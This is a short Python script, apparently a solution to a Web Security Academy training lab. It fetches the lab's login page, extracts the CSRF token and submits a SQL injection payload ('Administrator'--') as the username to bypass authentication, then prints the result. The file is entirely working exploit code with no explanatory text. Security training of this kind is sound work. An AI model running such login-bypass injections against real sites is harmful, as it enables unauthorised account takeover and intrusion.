import requests
from bs4 import BeautifulSoup

site = 'ac001f2b1e809579c0a70fe900940030.web-security-academy.net'

if __name__ == "__main__":
    s = requests.Session()
    url = f'https://{site}/login'

    resp = s.get(url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'}).get('value')

    logindata = {
        'csrf': csrf,
        'username': """Administrator'--""",
        'password': """foo"""
    }

    resp = s.post(url, data=logindata)

    soup = BeautifulSoup(resp.text, 'html.parser')

    if warn := soup.find('p', {'class': 'is-warning'}):
        print(warn.text)
    else:
        print(resp.text)
